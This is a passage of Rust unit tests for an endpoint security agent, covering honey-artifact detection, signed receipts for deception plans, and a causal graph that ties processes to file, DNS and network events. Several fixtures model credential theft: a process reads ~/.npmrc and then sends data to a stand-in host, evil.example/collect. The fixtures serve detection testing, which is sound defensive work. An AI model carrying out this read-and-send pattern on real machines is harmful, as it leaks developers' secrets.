            .any(|item| item.key == "matchType" && item.value == "network_destination"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_honey_hostname_dns_lookup() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::InternalHostname)
            .unwrap();
        let honey_host = artifact.internal_hostname().unwrap().to_string();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::DnsLookup {
            query: honey_host.clone(),
            record_type: Some("A".to_string()),
            answers: vec!["10.10.10.10".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "dns_query"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn deception_plan_detects_browser_cookie_honey_value() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let artifact = plan
            .artifacts
            .iter()
            .find(|artifact| artifact.kind == HoneyArtifactKind::BrowserCookieJar)
            .unwrap();
        let guard = SupplyChainRuntimeGuard::with_honey_artifacts(plan.artifacts.clone());
        let event = observation(EndpointEvent::CredentialAccess {
            kind: CredentialKind::BrowserCookie,
            path: None,
            name: Some(format!("intranet.invalid/session={}", artifact.marker)),
        });

        let findings = guard.evaluate(&event);

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].rule_id, "deception.honey_artifact_touched");
        assert!(findings[0]
            .evidence
            .iter()
            .any(|item| item.key == "matchType" && item.value == "browser_cookie"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_materialization_receipt_binds_plan_and_report() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let report = DeceptionMaterializationReport {
            created: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            skipped: Vec::new(),
        };
        let keypair = hush_core::Keypair::from_seed(&[44u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_deception_materialization(
            EndpointDeceptionMaterializationReceiptInput {
                local_sequence: 44,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                report: &report,
                registered_artifact_count: plan.artifacts.len(),
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionMaterialization
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "materializationReportHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "registeredArtifactCount"));

        let mut relabeled_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "deceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", "/tmp/other-plan-root");
        }
        assert!(relabeled_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let mut relabeled_artifact_ids = receipt.clone();
        if let Some(artifact_ids_evidence) = relabeled_artifact_ids
            .evidence
            .iter_mut()
            .find(|item| item.key == "artifactIds")
        {
            *artifact_ids_evidence = EndpointReceiptEvidence::hashed("artifactIds", "honey:other");
        }
        assert!(relabeled_artifact_ids
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization endpoint evidence hash"));

        let mut missing_artifact_count = receipt.clone();
        missing_artifact_count
            .evidence
            .retain(|item| item.key != "artifactCount");
        assert!(missing_artifact_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization artifact count evidence"));

        let mut relabeled_materialization_id = receipt.clone();
        relabeled_materialization_id.decision.finding_id =
            Some("deception_materialization:other".to_string());
        assert!(relabeled_materialization_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception materialization id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_cleanup_receipt_binds_plan_and_report() {
        let root = temp_root();
        let plan = DeceptionPlan::standard(&root, "endpoint-a");
        let report = DeceptionCleanupReport {
            dry_run: false,
            removed: plan
                .artifacts
                .iter()
                .map(|artifact| artifact.absolute_path(&root).display().to_string())
                .collect(),
            would_remove: Vec::new(),
            missing: Vec::new(),
            refused: Vec::new(),
        };
        let keypair = hush_core::Keypair::from_seed(&[45u8; 32]);
        let mut receipt =
            EndpointDecisionReceipt::for_deception_cleanup(EndpointDeceptionCleanupReceiptInput {
                local_sequence: 45,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                plan: &plan,
                report: &report,
                deregistered_artifact_count: plan.artifacts.len(),
                remaining_registered_artifact_count: 0,
            });
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionCleanup
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "cleanupReportHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "removedCount"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "deregisteredArtifactCount"));

        let mut relabeled_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "deceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("deceptionPlanRoot", "/tmp/other-plan-root");
        }
        assert!(relabeled_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let mut mismatched_dry_run = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup dry-run evidence hash"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup endpoint evidence hash"));

        let mut missing_cleanup_report = receipt.clone();
        missing_cleanup_report
            .evidence
            .retain(|item| item.key != "cleanupReportHash");
        assert!(missing_cleanup_report
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup report hash evidence"));

        let mut inconsistent_refused_count = receipt.clone();
        if let Some(refused_count) = inconsistent_refused_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "refusedCount")
        {
            *refused_count = EndpointReceiptEvidence::hashed("refusedCount", "1");
        }
        assert!(inconsistent_refused_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup refused count evidence hash"));

        let mut relabeled_removed_count = receipt.clone();
        if let Some(removed_count) = relabeled_removed_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "removedCount")
        {
            *removed_count = EndpointReceiptEvidence::hashed("removedCount", "0");
        }
        assert!(relabeled_removed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let mut relabeled_cleanup_id = receipt.clone();
        relabeled_cleanup_id.decision.finding_id = Some("deception_cleanup:other".to_string());
        assert!(relabeled_cleanup_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception cleanup id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn endpoint_deception_rotation_receipt_binds_old_and_new_plans() {
        let root = temp_root();
        let old_plan = DeceptionPlan::standard(&root, "endpoint-a-old");
        let new_plan = DeceptionPlan::standard(&root, "endpoint-a-new");
        let report = DeceptionRotationReport {
            dry_run: false,
            cleanup: DeceptionCleanupReport {
                dry_run: false,
                removed: old_plan
                    .artifacts
                    .iter()
                    .map(|artifact| artifact.absolute_path(&root).display().to_string())
                    .collect(),
                would_remove: Vec::new(),
                missing: Vec::new(),
                refused: Vec::new(),
            },
            materialization: Some(DeceptionMaterializationReport {
                created: new_plan
                    .artifacts
                    .iter()
                    .map(|artifact| artifact.absolute_path(&root).display().to_string())
                    .collect(),
                skipped: Vec::new(),
            }),
            deregistered_artifact_count: old_plan.artifacts.len(),
            registered_artifact_count: new_plan.artifacts.len(),
            remaining_registered_artifact_count: new_plan.artifacts.len(),
        };
        let keypair = hush_core::Keypair::from_seed(&[46u8; 32]);
        let mut receipt = EndpointDecisionReceipt::for_deception_rotation(
            EndpointDeceptionRotationReceiptInput {
                local_sequence: 46,
                endpoint_id: "endpoint-a",
                signer_identity: "local-edr:endpoint-a",
                policy: EndpointPolicySnapshot {
                    policy_version: "test-policy@1".to_string(),
                    policy_hash: sha256(b"test-policy").to_hex_prefixed(),
                    policy_epoch: 7,
                },
                sensor_state: EndpointSensorState::single_active_agent("agent-api:test"),
                old_plan: &old_plan,
                new_plan: &new_plan,
                report: &report,
            },
        );
        receipt.signer.signer_public_key = Some(keypair.public_key().to_hex());

        let signed = receipt.sign_with(&keypair).unwrap();
        let verification =
            signed.verify(&hush_core::receipt::PublicKeySet::new(keypair.public_key()));

        assert!(verification.valid);
        assert_eq!(
            receipt.receipt_family,
            EndpointDecisionReceiptFamily::DeceptionRotation
        );
        assert_eq!(receipt.decision.action, EndpointDecisionAction::Observe);
        assert!(receipt.decision.passed);
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "oldDeceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "newDeceptionPlanHash"));
        assert!(receipt
            .evidence
            .iter()
            .any(|item| item.key == "rotationReportHash"));

        let mut relabeled_old_plan_root = receipt.clone();
        if let Some(plan_root_evidence) = relabeled_old_plan_root
            .evidence
            .iter_mut()
            .find(|item| item.key == "oldDeceptionPlanRoot")
        {
            *plan_root_evidence =
                EndpointReceiptEvidence::hashed("oldDeceptionPlanRoot", "/tmp/other-old-plan");
        }
        assert!(relabeled_old_plan_root
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let mut mismatched_dry_run = receipt.clone();
        if let Some(dry_run_evidence) = mismatched_dry_run
            .evidence
            .iter_mut()
            .find(|item| item.key == "dryRun")
        {
            *dry_run_evidence = EndpointReceiptEvidence::hashed("dryRun", "true");
        }
        assert!(mismatched_dry_run
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation dry-run evidence hash"));

        let mut mismatched_endpoint = receipt.clone();
        if let Some(endpoint_evidence) = mismatched_endpoint
            .evidence
            .iter_mut()
            .find(|item| item.key == "endpointId")
        {
            *endpoint_evidence = EndpointReceiptEvidence::hashed("endpointId", "endpoint-other");
        }
        assert!(mismatched_endpoint
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation endpoint evidence hash"));

        let mut missing_rotation_report = receipt.clone();
        missing_rotation_report
            .evidence
            .retain(|item| item.key != "rotationReportHash");
        assert!(missing_rotation_report
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation report hash evidence"));

        let mut inconsistent_refused_count = receipt.clone();
        if let Some(refused_count) = inconsistent_refused_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "cleanupRefusedCount")
        {
            *refused_count = EndpointReceiptEvidence::hashed("cleanupRefusedCount", "1");
        }
        assert!(inconsistent_refused_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation cleanup refused count evidence hash"));

        let mut relabeled_cleanup_removed_count = receipt.clone();
        if let Some(removed_count) = relabeled_cleanup_removed_count
            .evidence
            .iter_mut()
            .find(|item| item.key == "cleanupRemovedCount")
        {
            *removed_count = EndpointReceiptEvidence::hashed("cleanupRemovedCount", "0");
        }
        assert!(relabeled_cleanup_removed_count
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let mut relabeled_rotation_id = receipt.clone();
        relabeled_rotation_id.decision.finding_id = Some("deception_rotation:other".to_string());
        assert!(relabeled_rotation_id
            .validate()
            .unwrap_err()
            .to_string()
            .contains("deception rotation id"));

        let _ = fs::remove_dir_all(root);
    }

    #[test]
    fn causal_graph_links_process_to_file_secret_and_network() {
        let mut recorder = CausalGraphRecorder::new();

        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-1".to_string();

        let file_nodes = recorder.record_observation(&file);
        let network_nodes = recorder.record_observation(&network);
        let graph = recorder.graph();

        assert!(graph.nodes.len() >= 3);
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Read));
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));

        let file_node = file_nodes.last().unwrap();
        let network_node = network_nodes.last().unwrap();
        let path = recorder.causal_path(file_node, network_node).unwrap();
        assert_eq!(path.first().unwrap(), file_node);
        assert_eq!(path.last().unwrap(), network_node);
    }

    #[test]
    fn causal_graph_links_process_to_dns_lookup() {
        let mut recorder = CausalGraphRecorder::new();
        let dns = observation(EndpointEvent::DnsLookup {
            query: "packages.example.invalid".to_string(),
            record_type: Some("A".to_string()),
            answers: vec!["192.0.2.10".to_string()],
            resolver: Some("10.0.0.53".to_string()),
            status: Some("noerror".to_string()),
        });

        let nodes = recorder.record_observation(&dns);
        let graph = recorder.graph();

        let dns_node_id = nodes.last().unwrap();
        let dns_node = graph
            .nodes
            .get(dns_node_id)
            .unwrap_or_else(|| panic!("missing DNS graph node"));
        assert_eq!(dns_node.kind, CausalNodeKind::DnsName);
        assert_eq!(dns_node.label, "packages.example.invalid");
        assert_eq!(dns_node.attributes["recordType"], "A");
        assert_eq!(dns_node.attributes["answers"][0], "192.0.2.10");
        assert!(graph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::ResolvedDns));
    }

    #[test]
    fn causal_graph_promotes_identity_context_to_attribution_nodes() {
        let mut recorder = CausalGraphRecorder::new();
        let mut metadata = BTreeMap::new();
        metadata.insert(
            "agentId".to_string(),
            serde_json::Value::String("agent:codex".to_string()),
        );
        metadata.insert(
            "workloadId".to_string(),
            serde_json::Value::String("spiffe://example.test/workload/codex".to_string()),
        );
        metadata.insert(
            "approvalId".to_string(),
            serde_json::Value::String("approval-123".to_string()),
        );
        metadata.insert(
            "posture".to_string(),
            serde_json::Value::String("managed".to_string()),
        );
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "api.example.test".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://api.example.test/upload".to_string()),
        });
        network.host_id = Some("host-1".to_string());
        network.user_id = Some("alice".to_string());
        network.session_id = Some("session-identity-1".to_string());
        network.metadata = metadata;

        let nodes = recorder.record_observation(&network);
        let graph = recorder.graph();

        assert!(nodes.len() >= 8);
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Host && node.label == "host-1"));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::User && node.label == "alice"));
        assert!(graph.nodes.values().any(|node| {
            node.kind == CausalNodeKind::Session
                && node.label == "session-identity-1"
                && node
                    .attributes
                    .get("posture")
                    .and_then(serde_json::Value::as_str)
                    == Some("managed")
        }));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Agent && node.label == "agent:codex"));
        assert!(graph.nodes.values().any(|node| {
            node.kind == CausalNodeKind::Workload
                && node.label == "spiffe://example.test/workload/codex"
        }));
        assert!(graph
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Approval && node.label == "approval-123"));
        for kind in [
            CausalEdgeKind::ObservedOn,
            CausalEdgeKind::RanAs,
            CausalEdgeKind::InSession,
            CausalEdgeKind::UsedAgent,
            CausalEdgeKind::UsedWorkload,
            CausalEdgeKind::AuthorizedBy,
        ] {
            assert!(graph.edges.iter().any(|edge| edge.kind == kind));
        }

        let agent_node_id = graph
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::Agent)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing agent attribution node"));
        let network_node_id = graph
            .nodes
            .values()
            .find(|node| node.kind == CausalNodeKind::Network)
            .map(|node| node.node_id.clone())
            .unwrap_or_else(|| panic!("missing network node"));
        let path = recorder
            .causal_path(&agent_node_id, &network_node_id)
            .unwrap_or_else(|| panic!("missing agent-to-network causal path"));
        assert_eq!(path.first().unwrap(), &agent_node_id);
        assert_eq!(path.last().unwrap(), &network_node_id);
    }

    #[test]
    fn causal_graph_exports_subgraph_for_process_cause_query() {
        let mut recorder = CausalGraphRecorder::new();
        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-subgraph-1".to_string();

        recorder.record_observation(&file);
        recorder.record_observation(&network);
        let process_node_id = file.process.stable_node_id();
        let subgraph = recorder
            .graph()
            .causal_subgraph_from(&process_node_id, 3)
            .unwrap();

        assert!(subgraph.nodes.contains_key(&process_node_id));
        assert!(subgraph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Read));
        assert!(subgraph
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::Connected));
        assert!(subgraph
            .nodes
            .values()
            .any(|node| node.label == ".npmrc" || node.label == "/Users/alice/.npmrc"));
        assert!(subgraph
            .nodes
            .values()
            .any(|node| node.label == "evil.example:443"));
    }

    #[test]
    fn causal_graph_exports_upstream_and_downstream_context() {
        let mut recorder = CausalGraphRecorder::new();
        let file = observation(EndpointEvent::FileAccess {
            operation: FileOperation::Read,
            path: "/Users/alice/.npmrc".to_string(),
            source_url: None,
            content_preview: None,
        });
        let mut network = observation(EndpointEvent::NetworkFlow {
            host: "evil.example".to_string(),
            port: 443,
            protocol: Some("tcp".to_string()),
            url: Some("https://evil.example/collect".to_string()),
        });
        network.observation_id = "network-context-1".to_string();

        recorder.record_observation(&file);
        let network_nodes = recorder.record_observation(&network);
        let network_node_id = network_nodes.last().unwrap();
        let context = recorder
            .graph()
            .causal_context_around(network_node_id, 2, 1)
            .unwrap();

        assert!(context.nodes.contains_key(network_node_id));
        assert!(context
            .edges
            .iter()
            .any(|edge| edge.kind == CausalEdgeKind::TemporalNext));
        assert!(context
            .nodes
            .values()
            .any(|node| node.label == ".npmrc" || node.label == "/Users/alice/.npmrc"));
        assert!(context
            .nodes
            .values()
            .any(|node| node.kind == CausalNodeKind::Process));
    }

    #[test]
    fn policy_event_converts_to_endpoint_observation() {
        let event = PolicyEvent {
            event_id: "policy-1".to_string(),
            event_type: PolicyEventType::NetworkEgress,
            timestamp: Utc::now(),
            session_id: Some("session".to_string()),
            data: PolicyEventData::Network(NetworkEventData {
                host: "api.example.com".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.com/v1".to_string()),
            }),
            metadata: Some(serde_json::json!({
                "endpointId": "endpoint-policy-1",
                "principalId": "principal-policy-1",
                "endpointAgentId": "agent-policy-1",
                "workload_identity": "spiffe://example.test/workload/policy-1",
                "approval_id": "approval-policy-1",
                "process": {
                    "pid": 9,
                    "image": "/usr/bin/python3",
                    "commandLine": "python3 script.py"
                }
            })),
            context: Some(serde_json::json!({
                "endpoint_id": "endpoint-context-should-not-win",
                "principalId": "principal-context-should-not-win"
            })),
        };

        let observation = EndpointObservation::from_policy_event(&event);

        assert_eq!(observation.observation_id, "policy-1");
        assert_eq!(observation.host_id.as_deref(), Some("endpoint-policy-1"));
        assert_eq!(observation.user_id.as_deref(), Some("principal-policy-1"));
        assert_eq!(observation.process.pid, Some(9));
        match &observation.event {
            EndpointEvent::NetworkFlow { host, port, .. } => {
                assert_eq!(host, "api.example.com");
                assert_eq!(*port, 443);
            }
            other => panic!("unexpected event: {other:?}"),
        }

        let actor = EndpointDecisionActor::from_observation("endpoint-policy-1", &observation);
        assert_eq!(actor.agent_id.as_deref(), Some("agent-policy-1"));
        assert_eq!(
            actor.workload_id.as_deref(),
            Some("spiffe://example.test/workload/policy-1")
        );
        assert_eq!(actor.approval_id.as_deref(), Some("approval-policy-1"));

        let mut recorder = CausalGraphRecorder::new();
        let touched_nodes = recorder.record_observation(&observation);
        let process_node = recorder
            .graph()
            .nodes
            .get(&touched_nodes[0])
            .unwrap_or_else(|| panic!("missing process node"));
        assert_eq!(process_node.attributes["agentId"], "agent-policy-1");
        assert_eq!(
            process_node.attributes["workloadId"],
            "spiffe://example.test/workload/policy-1"
        );
        assert_eq!(process_node.attributes["approvalId"], "approval-policy-1");
    }

    #[test]
    fn policy_event_context_identity_converts_to_endpoint_observation() {
        let event = PolicyEvent {
            event_id: "policy-context-1".to_string(),
            event_type: PolicyEventType::ToolCall,
            timestamp: Utc::now(),
            session_id: None,
            data: PolicyEventData::Tool(ToolEventData {
                tool_name: "mcp__filesystem__read_file".to_string(),
                parameters: serde_json::json!({ "path": "/repo/.env" }),
            }),
            metadata: Some(serde_json::json!({
                "process": {
                    "pid": 11,
                    "image": "/usr/bin/node",
                    "commandLine": "node mcp-server.js"
                }
            })),
            context: Some(serde_json::json!({
                "endpoint_id": "endpoint-context-1",
                "identity": {
                    "id": "principal-context-1"
                },
                "session": {
                    "session_id": "session-context-1"
                },
                "metadata": {
                    "runtimeAgentId": "runtime-agent-context-1",
                    "spiffeId": "spiffe://example.test/workload/context-1",
                    "approvalRequestId": "approval-context-1",
                    "policyEpoch": 42,
                    "policyVersion": "policy-context-v1"
                }
            })),
        };

        let observation = EndpointObservation::from_policy_event(&event);

        assert_eq!(observation.host_id.as_deref(), Some("endpoint-context-1"));
        assert_eq!(observation.user_id.as_deref(), Some("principal-context-1"));
        assert_eq!(observation.session_id.as_deref(), Some("session-context-1"));
        assert!(!observation.metadata.contains_key("context"));
        assert_eq!(observation.metadata["policyEpoch"], serde_json::json!(42));
        assert_eq!(
            observation.metadata["policyVersion"],
            serde_json::json!("policy-context-v1")
        );

        let actor = EndpointDecisionActor::from_observation("endpoint-context-1", &observation);
        assert_eq!(actor.agent_id.as_deref(), Some("runtime-agent-context-1"));
        assert_eq!(
            actor.workload_id.as_deref(),
            Some("spiffe://example.test/workload/context-1")
        );
        assert_eq!(actor.approval_id.as_deref(), Some("approval-context-1"));

        let mut recorder = CausalGraphRecorder::new();
        let touched_nodes = recorder.record_observation(&observation);
        let process_node = recorder
            .graph()
            .nodes
            .get(&touched_nodes[0])
            .unwrap_or_else(|| panic!("missing process node"));
        assert_eq!(
            process_node.attributes["agentId"],
            "runtime-agent-context-1"
        );
        assert_eq!(
            process_node.attributes["workloadId"],
            "spiffe://example.test/workload/context-1"
        );
        assert_eq!(process_node.attributes["approvalId"], "approval-context-1");
    }

    #[test]
    fn endpoint_observation_projects_to_policy_event() {
        let observation = EndpointObservation {
            observation_id: "history-network-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/usr/bin/curl".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::NetworkFlow {
                host: "api.example.com".to_string(),
                port: 443,
                protocol: Some("tcp".to_string()),
                url: Some("https://api.example.com/v1".to_string()),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected policy event should validate: {err}"));
        assert_eq!(event.event_id, "history-network-1");
        assert_eq!(event.event_type, PolicyEventType::NetworkEgress);
        assert_eq!(event.session_id.as_deref(), Some("session-1"));
        match event.data {
            PolicyEventData::Network(network) => {
                assert_eq!(network.host, "api.example.com");
                assert_eq!(network.port, 443);
                assert_eq!(network.protocol.as_deref(), Some("tcp"));
            }
            other => panic!("unexpected projected data: {other:?}"),
        }
        let metadata = event
            .metadata
            .and_then(|value| value.as_object().cloned())
            .unwrap_or_else(|| panic!("projected event should carry endpoint metadata"));
        assert_eq!(metadata["hostId"], "host-1");
        assert_eq!(metadata["endpointObservationId"], "history-network-1");
        assert_eq!(metadata["endpointEventKind"], "network_flow");
    }

    #[test]
    fn dns_lookup_projects_to_custom_policy_event_and_round_trips() {
        let observation = EndpointObservation {
            observation_id: "history-dns-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/usr/bin/dig".to_string()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::DnsLookup {
                query: "api.internal.example".to_string(),
                record_type: Some("AAAA".to_string()),
                answers: vec!["2001:db8::10".to_string()],
                resolver: Some("fd00::53".to_string()),
                status: Some("noerror".to_string()),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected DNS policy event should validate: {err}"));
        assert_eq!(event.event_id, "history-dns-1");
        assert_eq!(event.event_type, PolicyEventType::Custom);
        let PolicyEventData::Custom(custom) = &event.data else {
            panic!("unexpected projected data: {:?}", event.data);
        };
        assert_eq!(custom.custom_type, "endpoint.dns_lookup");
        assert_eq!(custom.extra["endpointEvent"]["type"], "dns_lookup");
        assert_eq!(
            custom.extra["endpointEvent"]["query"],
            "api.internal.example"
        );

        let round_trip = EndpointObservation::from_policy_event(&event);
        match &round_trip.event {
            EndpointEvent::DnsLookup {
                query,
                record_type,
                answers,
                resolver,
                status,
            } => {
                assert_eq!(query, "api.internal.example");
                assert_eq!(record_type.as_deref(), Some("AAAA"));
                assert_eq!(answers, &vec!["2001:db8::10".to_string()]);
                assert_eq!(resolver.as_deref(), Some("fd00::53"));
                assert_eq!(status.as_deref(), Some("noerror"));
            }
            other => panic!("unexpected round-trip event: {other:?}"),
        }
    }

    #[test]
    fn browser_download_projection_preserves_artifact_proof_fields() {
        let content_hash =
            "sha256:0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef";
        let observation = EndpointObservation {
            observation_id: "history-browser-download-1".to_string(),
            timestamp: Utc::now(),
            host_id: Some("host-1".to_string()),
            session_id: Some("session-1".to_string()),
            process: EndpointProcess {
                pid: Some(42),
                image: Some("/Applications/Google Chrome.app/Contents/MacOS/Google Chrome".into()),
                ..EndpointProcess::default()
            },
            event: EndpointEvent::BrowserDownload {
                browser: "chrome".to_string(),
                path: "/Users/alice/Downloads/tool.pkg".to_string(),
                source_url: Some("https://downloads.example.invalid/tool.pkg".to_string()),
                content_hash: Some(content_hash.to_string()),
                byte_count: Some(8192),
            },
            ..EndpointObservation::default()
        };

        let event = observation.to_policy_event_projection();

        event
            .validate()
            .unwrap_or_else(|err| panic!("projected browser download should validate: {err}"));
        let PolicyEventData::Custom(custom) = &event.data else {
            panic!("unexpected projected data: {:?}", event.data);
        };
        assert_eq!(custom.custom_type, "endpoint.browser_download");
        assert_eq!(custom.extra["endpointEvent"]["content_hash"], content_hash);
        assert_eq!(custom.extra["endpointEvent"]["byte_count"], 8192);

        let round_trip = EndpointObservation::from_policy_event(&event);
        match &round_trip.event {
            EndpointEvent::BrowserDownload {
                browser,
                path,
                source_url,
                content_hash: observed_hash,
                byte_count,
            } => {
                assert_eq!(browser, "chrome");
                assert_eq!(path, "/Users/alice/Downloads/tool.pkg");
                assert_eq!(
                    source_url.as_deref(),
                    Some("https://downloads.example.invalid/tool.pkg")
                );
                assert_eq!(observed_hash.as_deref(), Some(content_hash));
                assert_eq!(*byte_count, Some(8192));
            }
            other => panic!("unexpected round-trip event: {other:?}"),
        }

        let mut recorder = CausalGraphRecorder::new();
        recorder.record_observation(&round_trip);
        let download_node = recorder
            .graph()
            .nodes
            .values()
